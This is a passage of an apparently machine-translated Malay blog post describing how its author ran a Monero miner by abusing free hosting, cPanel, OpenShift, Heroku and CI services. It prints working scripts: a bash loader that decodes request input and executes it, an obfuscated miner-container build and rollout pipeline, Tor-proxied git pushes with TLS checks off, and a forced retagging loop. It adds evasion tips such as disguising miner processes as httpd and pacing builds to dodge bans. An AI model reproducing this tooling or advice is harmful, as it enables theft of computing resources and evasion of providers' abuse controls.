<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>Lebih baik hanya bergantung pada builtin kerana proses penambahan forking mungkin tidak dibenarkan di penjara web, tetapi selalu mungkin untuk<code>exec</code> yang membolehkan kita menggunakan kebanyakan utiliti baris perintah. Sebilangan besar cangkerang web ditulis dalam bahasa skrip lain seperti python atau php kerana anda tidak perlu bimbang tentang forking.<p>Dalam persekitaran cpanel lebih baik menggunakan nama statik untuk proses penambang, seperti<code>httpd</code> atau<code>php-fpm</code> kerana<code>cgi</code> didasarkan pada pemprosesan pelbagai, jadi pelayan selalu dipenuhi dengan banyak proses seperti ini, walaupun pemerhati yang berhati-hati harus memperhatikannya<em> pelbagai utas</em> corak penggunaan yang pastinya tidak biasa (atau mungkin) untuk bahasa seperti perl, php, ruby, atau python!<p>Proses juga mempunyai had masa secara lalai, (1 jam, 1 hari, dll.), Untuk ini kita hanya menggunakan cron job yang menghidupkan semula penitis.<p>Ini memerlukan banyak penyuntingan manual, cpanel api untuk mengotomatisasi ini sayangnya tidak terdedah kepada pengguna akhir, jadi hosting web adalah sasaran yang kikuk dan membosankan bagi penambang penambang kami.<h3 id=web_environments><a class=header-anchor href=#web_environments> Persekitaran web</a></h3><p>Disana ada<em> SaaS</em> penyedia yang mempunyai editor web yang digabungkan dengan wadah, seperti<a href="with a free tier before getting acquired by amazon"> awan 9</a> , [codeanywhere], [codenvy]. Menerapkan penitis di sini mudah (anda mempunyai persekitaran penuh), tetapi tetap berjalan adalah suatu beban, kerana mana-mana penyunting web interaktif menamatkan sesi sejurus selepas laman web ditutup, dan kontena tersebut kemudiannya tertidur (kecuali anda bayar tentu).<p>Mengelilingi ini hanya dapat bermakna bahawa kita harus membuat sesi terbuka, beberapa skrip dengan [dalang] mencapai hasil yang diinginkan, tetapi mempunyai jangka panjang, kebocoran memori, halaman web SPA yang kembung pastinya tidak menarik dan tidak tersembunyi, kerana dari backend penyedia, sesi yang dibuka 24/7 pasti kelihatan mencurigakan. Sesungguhnya, persekitaran web juga menjadi sasaran yang kikuk dan membosankan.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> Perkhidmatan aplikasi percuma</a></h3><p>Ini terutamanya<a href="when it used to have a free tier"> shift terbuka</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> dan [heroku]. Openshift, menjadi kubernetes agak mudah digunakan, tetapi penuh dengan konfigurasi perubahan, berikut adalah petikan:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>Ini adalah skrip yang digunakan untuk membina bekas perlombongan yang memerlukan templat yaml:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>Tetapi keseluruhan prosesnya melibatkan banyak langkah!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>Dalam kod pseudo:<ul><li><p>buat projek<li><p>buat aplikasi tanpa gambar<li><p>membina bekas perlombongan<li><p>menyebarkan wadah dengan konfigurasi penyebaran (abstraksi kubernetes)<li><p>melancarkan penyebaran</ul><p>The<code>build-build</code> skrip sebaliknya mencipta a<em> membina</em> bekas yang akan dilombong selama beberapa jam pada satu masa. Build dan pod biasa mempunyai sumber yang terpisah dalam openshift jadi kami memanfaatkan kedua-duanya. Openshift secara keseluruhan adalah pengalaman buruk kerana melancarkan lebih dari 4 pelepasan yang berbeza (mungkin lebih banyak lagi, saya berhenti mengesan setelah beberapa ketika) dan masing-masing memerlukan perubahan pada konfigurasi, mereka tidak mempunyai jalan peningkatan dan semuanya cepat berulang, dan itu biasa untuk membina / pod untuk berhenti, dan tidak dikumpulkan sampah ... mereka biasanya menjalankan pemulangan semula manual sekali-sekala, mungkin kubernetes hanya kereta :)<p>Konfigurasi Heroku sedikit lebih sederhana (tidak melibatkan kubernetes). Selain membina kontena, yang serupa dengan openhift, selebihnya hanya dua perintah cli<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>Bekas itu terus ditolak dengan kapal layar ke pendaftaran heroku.<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> Geseran dengan heroku (yang tahap bebasnya masih bertahan hingga saat penulisan) adalah bahawa dynos hanya dapat berjalan selama 22 hari sebulan sehingga mereka memerlukan beberapa pengurusan manual setiap bulan, lagi kikuk dan membosankan. Mereka memang melakukan beberapa gelombang larangan pada awalnya, dan kemudian mereka melumpuhkan pendaftaran melalui TOR, saya yakin saya adalah penyebabnya.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> Bekas CI atau VM</a></h3><p>Ini adalah sasaran yang paling sinergi untuk penitis kami. Terdapat banyak<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> syarikat, yang kebanyakannya membakar wang pelabur yang menawarkan tingkatan percuma dengan harapan dapat mengumpulkan sebahagian pasaran dalam perniagaan infrastruktur teknologi.<p>Semua perkhidmatan ini menawarkan sumber yang berbeza, mempunyai keperluan konfigurasi yang berbeza dan dijalankan di persekitaran yang berbeza. Saya tidak pernah menganggap automatik pendaftaran akaun kerana perkara-perkara semacam itu sangat mengerikan untuk diprogramkan, saya cuba menghindarinya sepanjang masa, jadi saya menjalani pendaftaran manual sebentar kerana saya ingin tahu apa jenis tindak balas anti spam yang akan saya perolehi (dan betapa berbeza dengan yang lain!). Anda dapat meneka beberapa perkara mengenai pengurusan syarikat dari cara mengendalikan spam:<ul><li><p>Adakah ia melakukan gelombang larangan? Kemudian mereka mempunyai polisi yang tidak ketat, masalah ditangani secara manual dan kes demi kes<li><p>Adakah ia memerlukan pengesahan telefon? Mereka telah didera pada masa lalu<li><p>Adakah mereka bertindak balas terhadap penggunaan sumber yang banyak? Mereka menggunakan anggaran yang ketat<li><p>Adakah mereka menerapkan sekatan akaun atau larangan bayangan? Sekiranya mereka melarang bayangan, mereka bermaksud sysadmin.</ul><p>Terdapat juga persoalan falsafah: Sekiranya perkhidmatan membolehkan anda menyalahgunakan sistem mereka untuk waktu yang lama, apakah ini bermaksud bahawa mereka mempunyai infrastruktur teratas yang mampu menangani beban, atau kawalan yang lemah terhadap sistem mereka? Dan anda mesti mempertimbangkan keseimbangan antara kebolehaksesan dan keselamatan, sistem yang terlalu selamat dapat menurunkan pengekalan pengguna.<p>Berikut adalah jadual yang menunjukkan beberapa perkhidmatan yang saya gunakan:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>konfigurasi<th style=text-align:center>prestasi<th style=text-align:center>tukul larangan<tr><td style=text-align:center>Bitrise<td style=color:red;text-align:center>buruk<td style=color:#ff0;text-align:center>sederhana<td style=color:#ff0;text-align:center>sederhana<tr><td style=text-align:center>Travis<td style=color:green;text-align:center>baik<td style=color:#ff0;text-align:center>sederhana<td style=color:green;text-align:center>baik<tr><td style=text-align:center>Keketaraan<td style=color:#ff0;text-align:center>sederhana<td style=color:red;text-align:center>buruk<td style=color:#ff0;text-align:center>sederhana<tr><td style=text-align:center>Gitlab<td style=color:#ff0;text-align:center>sederhana<td style=color:green;text-align:center>baik<td style=color:green;text-align:center>baik<tr><td style=text-align:center>Circleci<td style=color:red;text-align:center>buruk<td style=color:green;text-align:center>baik<td style=color:#ff0;text-align:center>sederhana<tr><td style=text-align:center>Semaphore<td style=color:green;text-align:center>baik<td style=color:green;text-align:center>baik<td style=color:#ff0;text-align:center>sederhana<tr><td style=text-align:center>Docker<td style=color:#ff0;text-align:center>sederhana<td style=color:#ff0;text-align:center>sederhana<td style=color:green;text-align:center>baik<tr><td style=text-align:center>Dermaga<td style=color:green;text-align:center>baik<td style=color:#ff0;text-align:center>sederhana<td style=color:#ff0;text-align:center>sederhana<tr><td style=text-align:center>Codefresh<td style=color:red;text-align:center>buruk<td style=color:green;text-align:center>baik<td style=color:#ff0;text-align:center>sederhana<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>sederhana<td style=color:#ff0;text-align:center>sederhana<td style=color:red;text-align:center>buruk<tr><td style=text-align:center>Saluran paip Azure<td style=color:#ff0;text-align:center>sederhana<td style=color:#ff0;text-align:center>sederhana<td style=color:red;text-align:center>buruk<tr><td style=text-align:center>Berterusanphp<td style=color:red;text-align:center>buruk<td style=color:#ff0;text-align:center>sederhana<td style=color:#ff0;text-align:center>sederhana<tr><td style=text-align:center>Rakan<td style=color:red;text-align:center>buruk<td style=color:red;text-align:center>buruk<td style=color:red;text-align:center>buruk<tr><td style=text-align:center>Drone<td style=color:red;text-align:center>buruk<td style=color:green;text-align:center>baik<td style=color:red;text-align:center>buruk<tr><td style=text-align:center>Juruukur<td style=color:red;text-align:center>buruk<td style=color:#ff0;text-align:center>sederhana<td style=color:red;text-align:center>buruk<tr><td style=text-align:center>Tidak pernah kod<td style=color:red;text-align:center>buruk<td style=color:green;text-align:center>baik<td style=color:#ff0;text-align:center>sederhana<tr><td style=text-align:center>Zeist / vercel<td style=color:red;text-align:center>buruk<td style=color:green;text-align:center>baik<td style=color:red;text-align:center>buruk</table><p>Dalam konteks ini, a<span style=color:green> baik</span> konfigurasi bermaksud bahawa tidak memerlukan banyak masa untuk mengkonfigurasi a<code>ci</code> pekerjaan untuk proses perlombongan (seperti semua perkhidmatan yang bergantung pada papan pemuka web dan bukannya repositori dot-file adalah tugas),<span style=color:red> buruk</span><code>ban-hammer</code> bermaksud sukar untuk mendaftar ke perkhidmatan, atau bahawa akaun akan dilarang dengan lebih agresif.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> Bitrise</a> memerlukan untuk menyiapkan projek, untuk menyimpulkan lingkungan, arsitektur sasaran, proses pelaksanaan dan hal-hal lain, sangat memakan masa untuk menyiapkan binaan sehingga mendapat penilaian buruk dalam konfigurasi.<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> Berterusanphp</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> Rakan</a> , [Codefresh] juga mempunyai banyak langkah konfigurasi non deklaratif manual.<p>Perkhidmatan seperti [saluran paip Azure],<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> Rakan</a> menerapkan larangan bayangan pada akaun, larangan bayangan tidak baik, kerana ini membuat anda meneka apakah ada yang tidak kena dengan konfigurasi anda atau tidak. Dengan beberapa perkhidmatan, anda dapat meneka alasan larangan tersebut (cukup banyak bangunan anda memerlukan terlalu banyak masa, atau anda membuat terlalu banyak kali dalam jangka masa yang singkat), untuk sebilangan yang lain seperti [Azure-saluran paip] Saya menganggap mereka menggunakan semacam cap jari ke repositori pengguna kerana larangan berlaku walaupun tanpa penyalahgunaan sumber, azure dan vercel juga dibatasi<code>DNS</code> akses dalam mesin pembinaan awam, jadi geseran tambahan yang perlu diatasi dengan terowong ad-hoc.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> Drone</a> memberikan akses kepada keseluruhan pemproses 16+ teras tetapi akhirnya melarang setelah 2 build<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> Keketaraan</a> juga memberikan akses kepada tuan rumah yang kuat dan tidak melarang agresif seperti drone.<p>Perkhidmatan kegemaran saya bukan kerana keuntungan tetapi untuk kemudahan dan kemudahan (juga dengan projek lain)<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> Travis</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> Semaphore</a> dan<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> Docker-hub</a> . Travis seperti CI standard dan sangat fleksibel, Semaphore adalah satu-satunya<code>DSL</code> untuk<code>CI</code> yang kelihatan mudah didekati dan baik, bukannya sekedar kotak pilihan yang tidak berkesudahan seperti UI lain, dan Docker hanya untuk kesederhanaan untuk memetakan file docker.<h3 id=builds_configs><a class=header-anchor href=#builds_configs> Membina konfigurasi</a></h3><p>Binaan tersebut dipicu oleh pekerjaan cron yang ditawarkan oleh perkhidmatan web atau oleh git commits. Oleh itu, anda mesti menjejaki sampah token akses atau kunci ssh untuk menguruskan semua git melakukan. Penting juga untuk tidak melakukan spam yang berlebihan, dan menggunakan proksi ketika mendorong ke repositori yang mengkonfigurasi git:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>Dengan menggunakan perkhidmatan hosting git, github adalah yang lebih teliti mengenai larangan, tetapi mereka hanya dilaksanakan setelah laporan penyalahgunaan oleh pentadbir perkhidmatan ci, gitlab melakukan gelombang larangan sekali, ketika saya mencoba memperbaharui percubaan CI (sembarangan). Saya tidak pernah menerima larangan untuk akaun bitbucket. Untuk (memaksa) mendorong git melakukan, kami mempunyai gelung yang panjang yang menandakan semula git repositori:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>Ada kemungkinan bahawa memaksa dengan cara ini bukanlah sesuatu yang sangat disukai oleh github dan mungkin menjadi penyebab akaun dibenderakan. Fungsi penanda yang ditugaskan dengan kuat mendorong komit yang berbeza, menggunakan laman web (yang dapat anda cari dengan mudah) yang memberikan beberapa komit secara rawak. Saya tidak pasti seberapa banyak perkara ini membantu, kerana kandungannya sendiri jelas mencurigakan kes saya. Dan itu juga menggigit saya sekali, kerana komit yang dikembalikan oleh perintah ini boleh merangkumi kata-kata sumpah, salah satu komit saya diambil oleh bot twitter yang melacak komit git dengan kata-kata sumpah! Saya menambah senarai hitam untuk kata-kata buruk selepas kejadian itu.<p>Saya tidak benar-benar menyelidiki komit git yang tidak jelas dan repositori git yang tidak jelas. Satu-satunya kejadian ketika saya menggunakan repositori yang lebih rumit adalah dengan Bitrise kerana anda tidak dapat menyiapkan binaan sekiranya sistem tidak mengenali persekitaran (seperti aplikasi mudah alih), tetapi walaupun tidak ada putaran dan selalu sama repositori, agak mudah dilihat.<p>Secara keseluruhan, jika saya harus membuat lengkung loceng sekitar masa yang optimum untuk saya gunakan<em> tanpa</em>mendapatkan akaun yang dilarang, di semua perkhidmatan yang diuji, dengan jangka masa pembangunan sekitar 1 jam, sekali sehari. Untuk inti cpu, selain untuk beberapa pembohong (seperti drone), kebanyakan perkhidmatan mengharapkan anda menggunakan jumlah sumber yang diberikan sepenuhnya kepada anda kerana binaan dijalankan di dalam VM atau bekas dengan sumber yang terhad ... dan penyusunan biasanya merupakan tugas yang tepu cpu, jadi tidak mempunyai kaitan statistik. Secara intuitif satu binaan setiap hari adalah apa yang akan dilakukan oleh rata-rata pembangun, jadi anda semestinya mengharapkan bendera yang dinaikkan jika anda menjauhkan diri dari kejahatan, dan mendorong penyalahgunaan tidak akan berakhir dengan baik.<h2 id=conclusions><a class=header-anchor href=#conclusions> Kesimpulannya</a></h2><p>Adakah ianya berbaloi? Bahagian rangkaian pasti menarik, berurusan dengan pendaftaran akaun jelas merupakan bahagian terburuk, golongan gemar suka mengklik e-mel pengesahan yang tidak berkesudahan dan mengulangi prosedur UI yang tidak berfungsi. Menulis perisian automasi spam juga membosankan (kerana kebanyakan anda mencabul API bodoh), dan dengan anggapan ini (dan kenyataan bahawa ini tidak pernah serius), saya tidak pernah menganggapnya. Adakah ia menguntungkan? Pada puncaknya ia mencapai sesuatu seperti<code>300$</code> sebulan, mungkin cukup untuk orang Venezuela, bukan untuk saya :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> sysadmin yang pemarah</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>walaupun ini akan mematahkan banyak andaian privasi, saya yakin kebanyakan dari mereka hanya mengintip ke dalam setiap kali ada masalah, tetapi ini hanya masalah untuk jangka masa berdasarkan kontena, sedangkan VM adalah kotak hitam.</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>pelombong yang dibina di simpul monero mendapat beberapa kerja untuk menjadikannya lebih mesra latar, tetapi pengedaran xmrig tidak pernah tertumpu pada keramahan latar belakang.</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>beberapa kumpulan menawarkan kesukaran yang berbeza pada port sambungan yang berlainan, dan cenderung menyelaraskan kesukaran pekerjaan dengan saham yang diturunkan oleh penambang, tetapi butiran proksi masih lebih mudah, kerana ia akan menghalang pengumpulan<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> mengunci</a> (walaupun kami tidak pernah menukar kolam).</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>tidak senang apabila konfigurasi tiba-tiba muncul dan hilang dari sistem fail</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>Kami tidak bercakap mengenai<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> protokol stratum</a> kerana kita hanya perlu menangani apa sahaja yang dilaksanakan di<em> kedua-duanya</em> kolam dan penambang ... yang biasanya minimum, dan mungkin dengan sambungan tidak standard.</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>jangan sekali-kali bash penuh :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>Saya belum meneroka apa yang berlaku ketika proses memuat fungsi tambahan pada waktu berjalan, kerana kernel akan mencari alamat dalam tata letak memori yang dapat dijalankan, yang akan mengakses sistem fail dan mungkin menyebabkan kemalangan.</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>Had sewenang-wenangnya, masa cpu kurang dari satu saat, memori kurang dari 128M, sambungan keluar disekat.</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>dengan sedikit kesabaran anda juga dapat menjalankan contoh ssh penuh melalui persekitaran yang diikat di sekitar ruang akaun cpanel anda,<em> tanpa</em> mempunyai akses ke cpanel builtin SSH yang cenderung dilumpuhkan oleh penyedia hosting.</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>openshift bermula dari tahap percuma 1 tahun hingga 3 bulan hingga 1 bulan, mula memerlukan pengesahan telefon, saya dapat menjamin bahawa saya bukan satu-satunya yang menyalahgunakan perkhidmatan mereka.</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Bekas tingkat Heroku cukup banyak sumbernya, mereka menyediakan 4c / 8t (maya) cpus, banyak ram dan penyimpanan besar (yang bagaimanapun tidak berterusan dan dibuang semasa penutupan dino).</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>Mereka menambah peraturan pendaftaran yang lebih ketat, setelah beberapa larangan, saya mungkin telah menyumbang.</table><p><div id=post-tags-list>Tanda Pos: <span class=post-tag><a href=https://www.unto.re/tag/crypto> kripto</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> bersih</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> tempurung</a></span></div><div class=page-foot><div class=copyright>21 Ogos 2021</div></div></div><div class=page__footer><footer><div class=page__footer-copyright>Â© untoreh - Dikuasakan oleh<a href=https://github.com/tlienart/Franklin.jl> Franklin</a></div><div class=page__footer-links>- <ul><li><a href=/ms/sitemapxml> Peta Laman</a></li> | <li><a href=/ms/tag> Teg</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></footer></div>